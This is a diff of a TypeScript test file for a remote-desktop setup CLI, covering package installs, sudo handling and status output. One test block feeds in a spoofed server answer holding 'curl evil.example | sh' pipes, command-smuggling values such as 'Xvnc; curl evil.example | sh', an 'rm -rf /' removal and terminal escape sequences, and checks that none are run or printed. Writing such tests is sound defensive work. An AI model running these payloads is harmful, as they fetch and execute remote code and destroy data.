@@ -1,6 +1,7 @@
 import type { DesktopStatus } from "@codevisor/api"
 import { describe, expect, it } from "vitest"
 
+import { fakeMachine, type FakeMachineOptions, UBUNTU } from "../desktop/desktop-test-support.js"
 import {
   type DesktopCliDeps,
   desktopRemoveCommand,
@@ -10,11 +11,23 @@ import {
 import { type FakeOptions, makeWorld } from "./support-test-support.js"
 
 const url = (path = "") => `http://127.0.0.1:49361/v1/desktop${path}`
-const install = [
-  ["env", "DEBIAN_FRONTEND=noninteractive", "apt-get", "update", "-q"],
-  ["env", "DEBIAN_FRONTEND=noninteractive", "apt-get", "install", "-y", "xfce4"]
-]
+const apt = "env DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=600"
+const aptUpdate = `${apt} update -q`
+const aptInstall = `${apt} install -y -q --no-install-recommends tigervnc-standalone-server tigervnc-common xfce4 xfce4-terminal dbus-x11 xclip python3 fonts-dejavu-core adwaita-icon-theme`
 const missing = ["Xvnc", "startxfce4"]
+const busy = "Installing packages"
+const withAnOldRootDesktop: FakeMachineOptions = {
+  files: {
+    ...UBUNTU,
+    "/etc/systemd/system/vncserver@.service": "[Unit]\nDescription=Codevisor desktop, TigerVNC\n"
+  },
+  folders: { "/etc/systemd/system/multi-user.target.wants": ["vncserver@1.service"] }
+}
+const removeTheOldOne = [
+  "systemctl disable --now vncserver@1.service",
+  "rm -f /etc/systemd/system/vncserver@.service",
+  "systemctl daemon-reload"
+]
 
 const status = (changes: Partial<DesktopStatus> = {}): DesktopStatus => ({
   state: "none",
@@ -27,14 +40,23 @@ const status = (changes: Partial<DesktopStatus> = {}): DesktopStatus => ({
   ...changes
 })
 
-const answers = (...bodies: DesktopStatus[]) => bodies.map((body) => ({ status: 200, body }))
+const answers = (...bodies: unknown[]) => bodies.map((body) => ({ status: 200, body }))
 const running = status({ state: "running", display: 1, managed: true })
 
-const world = (
-  http: FakeOptions["http"],
-  terminal: { interactive?: boolean; agrees?: boolean; isRoot?: boolean } = {}
-) => {
-  const fake = makeWorld({ http: http ?? {}, isRoot: terminal.isRoot ?? false })
+interface Terminal {
+  readonly interactive?: boolean
+  readonly agrees?: boolean
+  readonly isRoot?: boolean
+  readonly sudoFails?: boolean
+  readonly machine?: FakeMachineOptions
+}
+
+const world = (http: FakeOptions["http"], terminal: Terminal = {}) => {
+  const fake = makeWorld({
+    http: http ?? {},
+    isRoot: terminal.isRoot ?? false,
+    ...(terminal.sudoFails === true ? { interactiveExit: 100 } : {})
+  })
   const questions: string[] = []
   const deps: DesktopCliDeps = {
     ...fake.deps,
@@ -42,21 +64,17 @@ const world = (
     confirm: async (question) => {
       questions.push(question)
       return terminal.agrees ?? true
-    }
+    },
+    system: fakeMachine({ files: UBUNTU, ...terminal.machine }).system
   }
   return { ...fake, deps, questions }
 }
 
 describe("codevisor desktop setup", () => {
   it("has the server install and start everything when its account needs no sudo password", async () => {
-    const busy = "Installing packages"
     const machine = world({
-      [`GET ${url()}`]: answers(
-        status({ missing, install }),
-        status({ missing, install, busy }),
-        status({ install })
-      ),
-      [`POST ${url("/packages")}`]: answers(status({ missing, install, busy })),
+      [`GET ${url()}`]: answers(status({ missing }), status({ missing, busy }), status()),
+      [`POST ${url("/packages")}`]: answers(status({ missing, busy })),
       [`POST ${url("/start")}`]: answers(running)
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
@@ -75,13 +93,8 @@ describe("codevisor desktop setup", () => {
   it("waits for the server's install, and passes on why it failed", async () => {
     const failure = "Installing packages failed:\nE: Unable to locate package xfce4"
     const machine = world({
-      [`GET ${url()}`]: answers(
-        status({ missing, install }),
-        status({ missing, install, failure })
-      ),
-      [`POST ${url("/packages")}`]: answers(
-        status({ missing, install, busy: "Installing packages" })
-      )
+      [`GET ${url()}`]: answers(status({ missing }), status({ missing, failure })),
+      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
     expect(machine.errors).toEqual([failure])
@@ -89,15 +102,14 @@ describe("codevisor desktop setup", () => {
   })
 
   it("keeps waiting through a few unanswered checks during the install", async () => {
-    const busy = "Installing packages"
     const machine = world({
       [`GET ${url()}`]: [
-        ...answers(status({ missing, install })),
+        ...answers(status({ missing })),
         undefined,
         undefined,
-        ...answers(status({ install }))
+        ...answers(status())
       ],
-      [`POST ${url("/packages")}`]: answers(status({ missing, install, busy })),
+      [`POST ${url("/packages")}`]: answers(status({ missing, busy })),
       [`POST ${url("/start")}`]: answers(running)
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
@@ -105,10 +117,9 @@ describe("codevisor desktop setup", () => {
   })
 
   it("stops with the server's answer when it stops answering during the install", async () => {
-    const busy = "Installing packages"
     const machine = world({
-      [`GET ${url()}`]: [...answers(status({ missing, install })), undefined],
-      [`POST ${url("/packages")}`]: answers(status({ missing, install, busy }))
+      [`GET ${url()}`]: [...answers(status({ missing })), undefined],
+      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
     expect(machine.errors).toEqual([
@@ -117,10 +128,9 @@ describe("codevisor desktop setup", () => {
   })
 
   it("says the install is still going on when it outlasts the wait, instead of calling it failed", async () => {
-    const busy = "Installing packages"
     const machine = world({
-      [`GET ${url()}`]: answers(status({ missing, install }), status({ missing, install, busy })),
-      [`POST ${url("/packages")}`]: answers(status({ missing, install, busy }))
+      [`GET ${url()}`]: answers(status({ missing }), status({ missing, busy })),
+      [`POST ${url("/packages")}`]: answers(status({ missing, busy }))
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
     expect(machine.errors).toEqual([
@@ -129,19 +139,16 @@ describe("codevisor desktop setup", () => {
     expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
   })
 
-  it("runs sudo in the terminal when the account's sudo asks for a password", async () => {
+  it("runs sudo in the terminal, with its own apt commands, when the account's sudo asks for a password", async () => {
     const machine = world({
       [`GET ${url()}`]: answers(
-        status({ missing, install, sudo: "password" }),
-        status({ install, sudo: "password" })
+        status({ missing, sudo: "password" }),
+        status({ sudo: "password" })
       ),
       [`POST ${url("/start")}`]: answers(running)
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
-    expect(machine.interactiveCalls).toEqual([
-      "sudo env DEBIAN_FRONTEND=noninteractive apt-get update -q",
-      "sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y xfce4"
-    ])
+    expect(machine.interactiveCalls).toEqual([`sudo ${aptUpdate}`, `sudo ${aptInstall}`])
     expect(machine.httpCalls(`POST ${url("/packages")}`)).toBe(0)
     expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(1)
   })
@@ -149,19 +156,13 @@ describe("codevisor desktop setup", () => {
   it("runs the package manager itself when the command is run by root", async () => {
     const machine = world(
       {
-        [`GET ${url()}`]: answers(
-          status({ missing, install, sudo: "none" }),
-          status({ install, sudo: "none" })
-        ),
+        [`GET ${url()}`]: answers(status({ missing, sudo: "none" }), status({ sudo: "none" })),
         [`POST ${url("/start")}`]: answers(running)
       },
       { isRoot: true }
     )
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
-    expect(machine.interactiveCalls).toEqual([
-      "env DEBIAN_FRONTEND=noninteractive apt-get update -q",
-      "env DEBIAN_FRONTEND=noninteractive apt-get install -y xfce4"
-    ])
+    expect(machine.interactiveCalls).toEqual([aptUpdate, aptInstall])
   })
 
   it.each([
@@ -169,14 +170,14 @@ describe("codevisor desktop setup", () => {
     { name: "sudo asks and nobody is at a terminal", sudo: "password" as const, interactive: false }
   ])("prints the commands for an administrator and starts nothing when $name", async (given) => {
     const machine = world(
-      { [`GET ${url()}`]: answers(status({ missing, install, sudo: given.sudo })) },
+      { [`GET ${url()}`]: answers(status({ missing, sudo: given.sudo })) },
       { interactive: given.interactive }
     )
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
     expect(machine.errors).toEqual([
       "Installing packages needs an administrator. Ask one to run:",
-      "  env DEBIAN_FRONTEND=noninteractive apt-get update -q",
-      "  env DEBIAN_FRONTEND=noninteractive apt-get install -y xfce4",
+      `  ${aptUpdate}`,
+      `  ${aptInstall}`,
       "then run `codevisor desktop setup` again."
     ])
     expect(machine.interactiveCalls).toEqual([])
@@ -184,10 +185,13 @@ describe("codevisor desktop setup", () => {
   })
 
   it("names what to install on a system whose package manager it doesn't know", async () => {
-    const machine = world({
-      [`GET ${url()}`]: answers(status({ missing, system: "Fedora Linux 45" }))
-    })
+    const fedora = { "/etc/os-release": 'PRETTY_NAME="Fedora Linux 45"\nID=fedora\n' }
+    const machine = world(
+      { [`GET ${url()}`]: answers(status({ missing })) },
+      { machine: { files: fedora, programs: ["sudo"] } }
+    )
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
+    expect(machine.logs).toContain("    Fedora Linux 45, no desktop set up")
     expect(machine.errors).toEqual([
       "Codevisor doesn't know how to install packages on this system.",
       "Install these, then run setup again: Xvnc, startxfce4",
@@ -197,24 +201,24 @@ describe("codevisor desktop setup", () => {
   })
 
   it("stops when the package manager fails in the terminal", async () => {
-    const fake = makeWorld({
-      http: { [`GET ${url()}`]: answers(status({ missing, install, sudo: "password" })) },
-      interactiveExit: 100
-    })
-    const deps: DesktopCliDeps = { ...fake.deps, isInteractive: true, confirm: async () => true }
-    expect(await desktopSetupCommand(deps)).toBe(1)
-    expect(fake.interactiveCalls).toHaveLength(1)
-    expect(fake.errors).toEqual(["Installing packages failed."])
+    const machine = world(
+      { [`GET ${url()}`]: answers(status({ missing, sudo: "password" })) },
+      { sudoFails: true }
+    )
+    expect(await desktopSetupCommand(machine.deps)).toBe(1)
+    expect(machine.interactiveCalls).toHaveLength(1)
+    expect(machine.errors).toEqual(["Installing packages failed."])
   })
 
   it("skips the install when everything is already there, and says how to start at boot", async () => {
-    const hint = "sudo loginctl enable-linger dev"
     const machine = world({
       [`GET ${url()}`]: answers(status({ sudo: "none" })),
-      [`POST ${url("/start")}`]: answers({ ...running, startsAtBoot: false, startAtBootHint: hint })
+      [`POST ${url("/start")}`]: answers({ ...running, startsAtBoot: false, startAtBootHint: "x" })
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
-    expect(machine.logs.at(-1)).toBe(`    It starts at boot once this account lingers: ${hint}`)
+    expect(machine.logs.at(-1)).toBe(
+      "    It starts at boot once this account lingers: sudo loginctl enable-linger codevisor"
+    )
     expect(machine.interactiveCalls).toEqual([])
   })
 
@@ -230,18 +234,6 @@ describe("codevisor desktop setup", () => {
       "==> The desktop is already running. Open it from this machine in Codevisor."
     ])
     expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(1)
-  })
-
-  it("says it is starting a desktop that runs but isn't the server's own, since the server will replace it", async () => {
-    const machine = world({
-      [`GET ${url()}`]: answers({ ...running, managed: false }),
-      [`POST ${url("/start")}`]: answers(running)
-    })
-    expect(await desktopSetupCommand(machine.deps)).toBe(0)
-    expect(machine.logs.slice(-2)).toEqual([
-      "==> Starting the desktop as codevisor",
-      "==> The desktop is ready. Open it from this machine in Codevisor."
-    ])
   })
 
   it("reports the server's reason when the desktop doesn't start", async () => {
@@ -264,23 +256,76 @@ describe("codevisor desktop setup", () => {
   })
 })
 
-describe("an older desktop that runs as root", () => {
-  const oldDesktop = {
-    units: ["vncserver@1.service"],
-    removal: [
-      ["systemctl", "disable", "--now", "vncserver@1.service"],
-      ["systemctl", "daemon-reload"]
-    ]
+const everythingPrinted = (machine: ReturnType<typeof world>) =>
+  [...machine.logs, ...machine.errors, ...machine.interactiveCalls].join("\n")
+
+describe("an answer on the server's port that isn't the server's", () => {
+  const escape = String.fromCodePoint(27)
+  const hostile = {
+    ...status({ sudo: "password" }),
+    missing: ["Xvnc", "Xvnc; curl evil.example | sh"],
+    account: `root${escape}[2J`,
+    system: `Ubuntu${escape}]0;owned`,
+    install: [["sh", "-c", "curl evil.example | sh"]],
+    packageManager: "sh -c 'curl evil.example | sh'",
+    oldDesktop: { units: ["x; reboot"], removal: [["rm", "-rf", "/"]] },
+    startsAtBoot: false,
+    startAtBootHint: "curl evil.example | sudo sh",
+    logHint: `journalctl${escape}[31m`
   }
+
+  it("can make an administrator's setup run only the commands the command builds itself", async () => {
+    const machine = world({
+      [`GET ${url()}`]: answers(hostile, { ...hostile, missing: [] }),
+      [`POST ${url("/start")}`]: answers({ ...hostile, state: "running", managed: true })
+    })
+    expect(await desktopSetupCommand(machine.deps)).toBe(0)
+    expect(machine.interactiveCalls).toEqual([`sudo ${aptUpdate}`, `sudo ${aptInstall}`])
+    expect(everythingPrinted(machine)).not.toContain("evil.example")
+    expect(everythingPrinted(machine)).not.toContain(escape)
+    expect(machine.logs.at(-1)).toBe(
+      "    It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>"
+    )
+  })
+
+  it("can't make root remove anything: an old desktop is only what the machine's own files show", async () => {
+    const asRoot = world(
+      {
+        [`GET ${url()}`]: answers({ ...hostile, missing: [] }),
+        [`POST ${url("/start")}`]: answers(running)
+      },
+      { isRoot: true }
+    )
+    expect(await desktopSetupCommand(asRoot.deps, { yes: true })).toBe(0)
+    expect(asRoot.interactiveCalls).toEqual([])
+    expect(asRoot.questions).toEqual([])
+  })
+
+  it("can't put its own text in what status prints", async () => {
+    const machine = world({ [`GET ${url()}`]: answers({ ...hostile, state: "running" }) })
+    expect(await desktopStatusCommand(machine.deps)).toBe(0)
+    expect(machine.logs).toEqual([
+      "The desktop is running as the server's account.",
+      "It starts at boot once this account lingers: sudo loginctl enable-linger <the server's account>",
+      "Log: journalctl[31m"
+    ])
+  })
+})
+
+describe("an older desktop that runs as root", () => {
   const question =
     "An older desktop runs as root on this machine. Replace it? Everything open in it will close."
+  const found = { machine: withAnOldRootDesktop }
 
   it("is replaced after asking once, then the new desktop starts", async () => {
-    const machine = world({
-      [`GET ${url()}`]: answers(status({ oldDesktop })),
-      [`POST ${url("/replace-old")}`]: answers(status()),
-      [`POST ${url("/start")}`]: answers(running)
-    })
+    const machine = world(
+      {
+        [`GET ${url()}`]: answers(status()),
+        [`POST ${url("/replace-old")}`]: answers(status()),
+        [`POST ${url("/start")}`]: answers(running)
+      },
+      found
+    )
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
     expect(machine.questions).toEqual([question])
     expect(machine.httpCalls(`POST ${url("/replace-old")}`)).toBe(1)
@@ -288,7 +333,7 @@ describe("an older desktop that runs as root", () => {
   })
 
   it("is left alone, with nothing else changed, when the answer is no", async () => {
-    const machine = world({ [`GET ${url()}`]: answers(status({ oldDesktop })) }, { agrees: false })
+    const machine = world({ [`GET ${url()}`]: answers(status()) }, { ...found, agrees: false })
     expect(await desktopSetupCommand(machine.deps)).toBe(1)
     expect(machine.httpCalls(`POST ${url("/replace-old")}`)).toBe(0)
     expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
@@ -296,11 +341,11 @@ describe("an older desktop that runs as root", () => {
 
   it("is not replaced unasked where there is no terminal, unless --yes was given", async () => {
     const http = {
-      [`GET ${url()}`]: answers(status({ oldDesktop })),
+      [`GET ${url()}`]: answers(status()),
       [`POST ${url("/replace-old")}`]: answers(status()),
       [`POST ${url("/start")}`]: answers(running)
     }
-    const unattended = world(http, { interactive: false })
+    const unattended = world(http, { ...found, interactive: false })
     expect(await desktopSetupCommand(unattended.deps)).toBe(1)
     expect(unattended.errors).toEqual([
       question,
@@ -308,25 +353,64 @@ describe("an older desktop that runs as root", () => {
     ])
     expect(unattended.httpCalls(`POST ${url("/replace-old")}`)).toBe(0)
 
-    const agreed = world(http, { interactive: false })
+    const agreed = world(http, { ...found, interactive: false })
     expect(await desktopSetupCommand(agreed.deps, { yes: true })).toBe(0)
     expect(agreed.questions).toEqual([])
     expect(agreed.httpCalls(`POST ${url("/replace-old")}`)).toBe(1)
   })
 
   it("is removed with sudo in the terminal when the account's sudo asks for a password", async () => {
+    const machine = world(
+      {
+        [`GET ${url()}`]: answers(status({ sudo: "password" })),
+        [`POST ${url("/start")}`]: answers(running)
+      },
+      found
+    )
+    expect(await desktopSetupCommand(machine.deps)).toBe(0)
+    expect(machine.interactiveCalls).toEqual(removeTheOldOne.map((command) => `sudo ${command}`))
+  })
+
+  it("is named by status", async () => {
+    const machine = world({ [`GET ${url()}`]: answers(status({ state: "outdated" })) }, found)
+    await desktopStatusCommand(machine.deps)
+    expect(machine.logs).toEqual([
+      "This machine's desktop was set up for an older version of Codevisor.",
+      "Set it up again with: codevisor desktop setup",
+      "An older desktop still runs as root (vncserver@1.service). Replace it with: codevisor desktop setup"
+    ])
+  })
+})
+
+describe("a desktop that runs but that Codevisor didn't set up", () => {
+  const theirs = status({ state: "running", display: 4, managed: false })
+  const question =
+    "A desktop that Codevisor didn't set up is shared from this machine. Replace it with a new one? The old one keeps running but is no longer shared."
+
+  it("is replaced only after asking, and the server is told the answer", async () => {
     const machine = world({
-      [`GET ${url()}`]: answers(
-        status({ oldDesktop, sudo: "password" }),
-        status({ sudo: "password" })
-      ),
-      [`POST ${url("/start")}`]: answers(running)
+      [`GET ${url()}`]: answers(theirs),
+      [`POST ${url("/start?replace=1")}`]: answers(running)
     })
     expect(await desktopSetupCommand(machine.deps)).toBe(0)
-    expect(machine.interactiveCalls).toEqual([
-      "sudo systemctl disable --now vncserver@1.service",
-      "sudo systemctl daemon-reload"
+    expect(machine.questions).toEqual([question])
+    expect(machine.logs.slice(-2)).toEqual([
+      "==> Starting the desktop as codevisor",
+      "==> The desktop is ready. Open it from this machine in Codevisor."
     ])
+  })
+
+  it("is left as it is when the answer is no, or when nobody can be asked", async () => {
+    const http = {
+      [`GET ${url()}`]: answers(theirs),
+      [`POST ${url("/start?replace=1")}`]: answers(running)
+    }
+    for (const terminal of [{ agrees: false }, { interactive: false }]) {
+      const machine = world(http, terminal)
+      expect(await desktopSetupCommand(machine.deps)).toBe(1)
+      expect(machine.httpCalls(`POST ${url("/start?replace=1")}`)).toBe(0)
+      expect(machine.httpCalls(`POST ${url("/start")}`)).toBe(0)
+    }
   })
 })
 
@@ -359,32 +443,17 @@ describe("codevisor desktop status", () => {
       ]
     },
     {
-      given: status({
-        state: "outdated",
-        oldDesktop: { units: ["vncserver@1.service"], removal: [] }
-      }),
+      given: { ...running, startsAtBoot: false, logHint: "/logs/desktop.log" },
       lines: [
-        "This machine's desktop was set up for an older version of Codevisor.",
-        "Set it up again with: codevisor desktop setup",
-        "An older desktop still runs as root (vncserver@1.service). Replace it with: codevisor desktop setup"
+        "The desktop is running as codevisor on display :1.",
+        "It starts when the Codevisor server starts, not by itself at boot.",
+        "Log: /logs/desktop.log"
       ]
     }
   ])("says what is there: $given.state", async ({ given, lines }) => {
     const machine = world({ [`GET ${url()}`]: answers(given) })
     expect(await desktopStatusCommand(machine.deps)).toBe(0)
     expect(machine.logs).toEqual(lines)
-  })
-
-  it("says a desktop without a boot service starts with the server", async () => {
-    const machine = world({
-      [`GET ${url()}`]: answers({ ...running, startsAtBoot: false, logHint: "/logs/desktop.log" })
-    })
-    await desktopStatusCommand(machine.deps)
-    expect(machine.logs).toEqual([
-      "The desktop is running as codevisor on display :1.",
-      "It starts when the Codevisor server starts, not by itself at boot.",
-      "Log: /logs/desktop.log"
-    ])
   })
 
   it("passes on the server's answer on a machine that can't have a desktop", async () => {
